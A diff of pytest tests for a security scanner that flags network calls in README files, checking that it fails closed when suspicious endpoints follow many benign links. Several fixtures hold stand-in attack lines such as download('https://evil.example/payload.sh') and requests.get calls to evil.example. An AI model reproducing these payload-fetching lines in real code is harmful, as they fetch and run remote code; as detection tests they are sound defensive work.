-        check.details.get("truncated_finding_type") == "endpoint_redaction_classification" for check in result.checks
-    )
-
-
-def test_text_scanner_documentation_redaction_exhaustion_is_not_reporting_only() -> None:
-    assert (
-        TextScanner._passive_network_reporting_limit(
-            "README.md",
-            b"https://docs.example.com/reference\n",
-            [],
-            {
-                "type": "detector_finding_limit",
-                "detector": "network_communication",
-                "severity": "INFO",
-                "max_classifications": 32,
-                "truncated_finding_type": "endpoint_redaction_classification",
-                "truncated_finding": None,
-                "analysis_incomplete": True,
-            },
-        )
-        is False
     )
 
 
@@ -5796,43 +4306,365 @@ def test_text_scanner_documentation_code_url_after_limit_fails_closed(tmp_path: 
     assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
 
 
-def test_text_scanner_documentation_domain_after_url_on_limit_fails_closed(tmp_path: Path) -> None:
+def test_text_scanner_documentation_passive_endpoint_redaction_limit_is_informational(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(network_comm, "_redact_network_evidence", lambda text: text)
     text_path = tmp_path / "README.md"
     text_path.write_text(
-        ("https://docs.example.com/reference\n" * 3)
-        + "See https://docs.example.com/reference; endpoint: evil.example\n",
+        "api_key references below are documentation-only.\n"
+        + "\n".join(f"Reference {index}: https://cdn.openai.com/papers/{index}.pdf" for index in range(40))
+        + "\n@misc{whisper,\n  url = {https://arxiv.org/abs/2212.04356},\n}\n"
+        + "\n",
         encoding="utf-8",
     )
 
-    result = TextScanner(
-        config={
-            "check_secrets": False,
-            "text_content_max_findings": 2,
-        }
-    ).scan(str(text_path))
+    result = TextScanner(config={"check_secrets": False}).scan(str(text_path))
+
+    assert result.success is True
+    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
+    assert any(
+        check.name == "Network Communication Reporting Limit"
+        and check.severity == IssueSeverity.INFO
+        and check.details.get("truncated_finding_type") == "endpoint_redaction_classification"
+        and check.details.get("analysis_incomplete") is False
+        and check.details.get("reporting_incomplete") is True
+        for check in result.checks
+    )
+    assert not any(
+        check.name == "Text Content Security Coverage" and check.status == CheckStatus.FAILED for check in result.checks
+    )
+
+
+def test_text_scanner_documentation_passive_raw_table_endpoint_redaction_limit_is_informational(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(network_comm, "_redact_network_evidence", lambda text: text)
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "api_key references below are documentation-only.\n"
+        "| Helper | Reference |\n"
+        "| --- | --- |\n"
+        + "\n".join(f"| download( | https://cdn.openai.com/papers/{index}.pdf |" for index in range(40))
+        + "\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner(config={"check_secrets": False}).scan(str(text_path))
+    aggregate = scan_model_directory_or_file(
+        str(text_path),
+        config={"check_secrets": False},
+        cache_enabled=False,
+    )
+
+    assert result.success is True
+    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
+    assert determine_exit_code(aggregate) == 0
+    assert any(
+        check.name == "Network Communication Reporting Limit"
+        and check.severity == IssueSeverity.INFO
+        and check.details.get("truncated_finding_type") == "endpoint_redaction_classification"
+        and check.details.get("analysis_incomplete") is False
+        and check.details.get("reporting_incomplete") is True
+        for check in result.checks
+    )
+    assert not any(
+        check.name == "Text Content Security Coverage" and check.status == CheckStatus.FAILED for check in result.checks
+    )
+
+
+def test_text_scanner_documentation_passive_unknown_tld_redaction_limit_is_informational(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(network_comm, "_redact_network_evidence", lambda text: text)
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "api_key references below are documentation-only.\n"
+        + "\n".join(f"Reference {index}: https://cdn.openai.com/papers/{index}.pdf" for index in range(40))
+        + "\nThe paper mirror research.online is listed for citation context.\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner(config={"check_secrets": False}).scan(str(text_path))
+    aggregate = scan_model_directory_or_file(
+        str(text_path),
+        config={"check_secrets": False},
+        cache_enabled=False,
+    )
+
+    assert result.success is True
+    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
+    assert determine_exit_code(aggregate) == 0
+    assert any(
+        check.name == "Network Communication Reporting Limit"
+        and check.severity == IssueSeverity.INFO
+        and check.details.get("truncated_finding_type") == "endpoint_redaction_classification"
+        and check.details.get("analysis_incomplete") is False
+        and check.details.get("reporting_incomplete") is True
+        for check in result.checks
+    )
+    assert not any(
+        check.name == "Text Content Security Coverage" and check.status == CheckStatus.FAILED for check in result.checks
+    )
+
+
+def test_text_scanner_documentation_endpoint_redaction_limit_with_code_fails_closed(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(network_comm, "_redact_network_evidence", lambda text: text)
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "api_key references below are documentation-only.\n"
+        + "\n".join(f"Reference {index}: https://cdn.openai.com/papers/{index}.pdf" for index in range(40))
+        + '\ndownload("https://evil.example/payload.sh")\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner(config={"check_secrets": False}).scan(str(text_path))
+    aggregate = scan_model_directory_or_file(
+        str(text_path),
+        config={"check_secrets": False},
+        cache_enabled=False,
+    )
 
     assert result.success is False
     assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
     assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
+    assert determine_exit_code(aggregate) == 2
+    assert any(
+        check.name == "Text Content Security Coverage"
+        and check.details.get("truncated_finding_type") == "endpoint_redaction_classification"
+        and check.details.get("scan_outcome_reason") == "text_content_security_finding_limit"
+        for check in result.checks
+    )
 
 
-def test_text_scanner_documentation_code_domain_after_limit_fails_closed(tmp_path: Path) -> None:
+def test_text_scanner_documentation_endpoint_redaction_limit_with_wrapped_call_fails_closed(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(network_comm, "_redact_network_evidence", lambda text: text)
     text_path = tmp_path / "README.md"
     text_path.write_text(
-        ("https://docs.example.com/reference\n" * 3) + 'server = "evil.example"\n',
+        "api_key references below are documentation-only.\n"
+        + "\n".join(f"Reference {index}: https://cdn.openai.com/papers/{index}.pdf" for index in range(40))
+        + '\ndownload(\n    "[download](https://evil.example/payload.sh)"\n)\n',
         encoding="utf-8",
     )
 
-    result = TextScanner(
-        config={
-            "check_secrets": False,
-            "text_content_max_findings": 2,
-        }
-    ).scan(str(text_path))
+    result = TextScanner(config={"check_secrets": False}).scan(str(text_path))
+    aggregate = scan_model_directory_or_file(
+        str(text_path),
+        config={"check_secrets": False},
+        cache_enabled=False,
+    )
 
     assert result.success is False
     assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
     assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
+    assert determine_exit_code(aggregate) == 2
+    assert any(
+        check.name == "Text Content Security Coverage"
+        and check.details.get("truncated_finding_type") == "endpoint_redaction_classification"
+        and check.details.get("scan_outcome_reason") == "text_content_security_finding_limit"
+        for check in result.checks
+    )
+
+
+def test_text_scanner_documentation_endpoint_redaction_limit_with_multiline_dict_fails_closed(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(network_comm, "_redact_network_evidence", lambda text: text)
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "api_key references below are documentation-only.\n"
+        + "\n".join(f"Reference {index}: https://cdn.openai.com/papers/{index}.pdf" for index in range(40))
+        + '\npayloads = {\n    "doc": "[download](https://evil.example/payload.sh)"\n}\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner(config={"check_secrets": False}).scan(str(text_path))
+    aggregate = scan_model_directory_or_file(
+        str(text_path),
+        config={"check_secrets": False},
+        cache_enabled=False,
+    )
+
+    assert result.success is False
+    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
+    assert determine_exit_code(aggregate) == 2
+    assert any(
+        check.name == "Text Content Security Coverage"
+        and check.details.get("truncated_finding_type") == "endpoint_redaction_classification"
+        and check.details.get("scan_outcome_reason") == "text_content_security_finding_limit"
+        for check in result.checks
+    )
+
+
+def test_text_scanner_documentation_endpoint_redaction_limit_with_actionable_finding_fails_closed(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(network_comm, "_redact_network_evidence", lambda text: text)
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "api_key references below are documentation-only.\n"
+        + "\n".join(f"Reference {index}: https://cdn.openai.com/papers/{index}.pdf" for index in range(40))
+        + "\nAPI_URL = load_endpoint()\nrequests.get(API_URL)\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner(config={"check_secrets": False}).scan(str(text_path))
+    aggregate = scan_model_directory_or_file(
+        str(text_path),
+        config={"check_secrets": False},
+        cache_enabled=False,
+    )
+
+    assert result.success is False
+    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
+    assert determine_exit_code(aggregate) == 2
+    assert any(
+        check.name == "Text Content Security Coverage"
+        and check.details.get("truncated_finding_type") == "endpoint_redaction_classification"
+        and check.details.get("scan_outcome_reason") == "text_content_security_finding_limit"
+        for check in result.checks
+    )
+
+
+def test_text_scanner_documentation_endpoint_redaction_limit_with_nested_config_fails_closed(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(network_comm, "_redact_network_evidence", lambda text: text)
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "api_key references below are documentation-only.\n"
+        + "\n".join(f"Reference {index}: https://cdn.openai.com/papers/{index}.pdf" for index in range(40))
+        + "\nendpoint:\n  url: https://evil.example/payload.sh\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner(config={"check_secrets": False}).scan(str(text_path))
+    aggregate = scan_model_directory_or_file(
+        str(text_path),
+        config={"check_secrets": False},
+        cache_enabled=False,
+    )
+
+    assert result.success is False
+    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
+    assert determine_exit_code(aggregate) == 2
+    assert any(
+        check.name == "Text Content Security Coverage"
+        and check.details.get("truncated_finding_type") == "endpoint_redaction_classification"
+        and check.details.get("scan_outcome_reason") == "text_content_security_finding_limit"
+        for check in result.checks
+    )
+
+
+def test_text_scanner_documentation_endpoint_redaction_limit_with_list_nested_config_fails_closed(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(network_comm, "_redact_network_evidence", lambda text: text)
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "api_key references below are documentation-only.\n"
+        + "\n".join(f"Reference {index}: https://cdn.openai.com/papers/{index}.pdf" for index in range(40))
+        + "\nendpoint:\n  - url: https://evil.example/payload.sh\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner(config={"check_secrets": False}).scan(str(text_path))
+    aggregate = scan_model_directory_or_file(
+        str(text_path),
+        config={"check_secrets": False},
+        cache_enabled=False,
+    )
+
+    assert result.success is False
+    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
+    assert determine_exit_code(aggregate) == 2
+    assert any(
+        check.name == "Text Content Security Coverage"
+        and check.details.get("truncated_finding_type") == "endpoint_redaction_classification"
+        and check.details.get("scan_outcome_reason") == "text_content_security_finding_limit"
+        for check in result.checks
+    )
+
+
+def test_text_scanner_documentation_endpoint_redaction_limit_with_list_object_config_fails_closed(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(network_comm, "_redact_network_evidence", lambda text: text)
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "api_key references below are documentation-only.\n"
+        + "\n".join(f"Reference {index}: https://cdn.openai.com/papers/{index}.pdf" for index in range(40))
+        + "\nendpoints:\n  - name: prod\n    url: https://evil.example/payload.sh\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner(config={"check_secrets": False}).scan(str(text_path))
+    aggregate = scan_model_directory_or_file(
+        str(text_path),
+        config={"check_secrets": False},
+        cache_enabled=False,
+    )
+
+    assert result.success is False
+    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
+    assert determine_exit_code(aggregate) == 2
+    assert any(
+        check.name == "Text Content Security Coverage"
+        and check.details.get("truncated_finding_type") == "endpoint_redaction_classification"
+        and check.details.get("scan_outcome_reason") == "text_content_security_finding_limit"
+        for check in result.checks
+    )
+
+
+def test_text_scanner_documentation_endpoint_redaction_limit_with_unknown_tld_config_domain_fails_closed(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(network_comm, "_redact_network_evidence", lambda text: text)
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "api_key references below are documentation-only.\n"
+        + "\n".join(f"Reference {index}: https://cdn.openai.com/papers/{index}.pdf" for index in range(40))
+        + "\nendpoint: evil.online\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner(config={"check_secrets": False}).scan(str(text_path))
+    aggregate = scan_model_directory_or_file(
+        str(text_path),
+        config={"check_secrets": False},
+        cache_enabled=False,
+    )
+
+    assert result.success is False
+    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
+    assert determine_exit_code(aggregate) == 2
+    assert any(
+        check.name == "Text Content Security Coverage"
+        and check.details.get("truncated_finding_type") == "endpoint_redaction_classification"
+        and check.details.get("scan_outcome_reason") == "text_content_security_finding_limit"
+        for check in result.checks
+    )
 
 
 def test_text_scanner_documentation_classification_limit_is_inconclusive(tmp_path: Path) -> None:
@@ -5873,89 +4705,6 @@ def test_text_scanner_documentation_classification_exact_limit_is_complete(tmp_p
         check.details.get("scan_outcome_reason") == "text_content_security_classification_limit"
         for check in result.checks
     )
-
-
-def test_text_scanner_documentation_fence_classification_limit_fails_closed(tmp_path: Path) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        ("```python\npass\n```\n" * ((MAX_DOCUMENTATION_FENCE_MARKERS // 2) + 1))
-        + '```python\nrequests.get("https://evil.example/payload")\n```\n',
-        encoding="utf-8",
-    )
-
-    result = TextScanner(config={"check_secrets": False}).scan(str(text_path))
-    aggregate = scan_model_directory_or_file(
-        str(text_path),
-        config={"check_secrets": False},
-        cache_enabled=False,
-    )
-
-    assert result.success is False
-    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
-    assert result.metadata.get("operational_error_reason") == "text_content_security_classification_limit"
-    assert determine_exit_code(aggregate) == 2
-    assert any(
-        check.name == "Text Content Security Coverage"
-        and check.details.get("scan_outcome_reason") == "text_content_security_classification_limit"
-        for check in result.checks
-    )
-
-
-def test_text_scanner_documentation_fence_ranges_are_precomputed_once(monkeypatch: pytest.MonkeyPatch) -> None:
-    payload = b"```bash\ngit clone https://github.com/example-org/model.git\n```\n" * 64
-    url_position = payload.find(b"https://")
-    findings = [
-        {
-            "type": "url_detected",
-            "url": "https://github.com/example-org/model.git",
-            "severity": "MEDIUM",
-            "position": url_position,
-        }
-        for _ in range(64)
-    ]
-    calls = 0
-    original = TextScanner._documentation_fenced_code_ranges
-
-    def count_ranges(cls: type[TextScanner], data: bytes) -> tuple[tuple[tuple[int, int], ...], bool]:
-        nonlocal calls
-        calls += 1
-        return original(data)
-
-    monkeypatch.setattr(TextScanner, "_documentation_fenced_code_ranges", classmethod(count_ranges))
-
-    classified, incomplete, limit_sources = TextScanner._downgrade_sidecar_network_findings(
-        "README.md",
-        payload,
-        findings,
-    )
-
-    assert incomplete is False
-    assert limit_sources == set()
-    assert calls == 1
-    assert all(finding["severity"] == "INFO" for finding in classified)
-
-
-def test_text_scanner_fenced_documentation_string_spans_are_precomputed_once(
-    monkeypatch: pytest.MonkeyPatch,
-) -> None:
-    assignments = "\n".join(f'value_{index} = "local_{index}.txt"' for index in range(800))
-    fenced_code = (
-        assignments + '\nurl = "http://images.cocodataset.org/val2017/000000039769.jpg"\nrequests.get(url)\n'
-    ).encode()
-    calls = 0
-    original = TextScanner._documentation_python_string_absolute_spans
-
-    def count_spans(
-        source: bytes,
-    ) -> tuple[tuple[int, int, str, bool], ...]:
-        nonlocal calls
-        calls += 1
-        return original(source)
-
-    monkeypatch.setattr(TextScanner, "_documentation_python_string_absolute_spans", staticmethod(count_spans))
-
-    assert TextScanner._documentation_fenced_passive_network_example_is_informational(fenced_code)
-    assert calls == 1
 
 
 def test_text_scanner_documentation_classification_exact_limit_ignores_passive_followups() -> None:
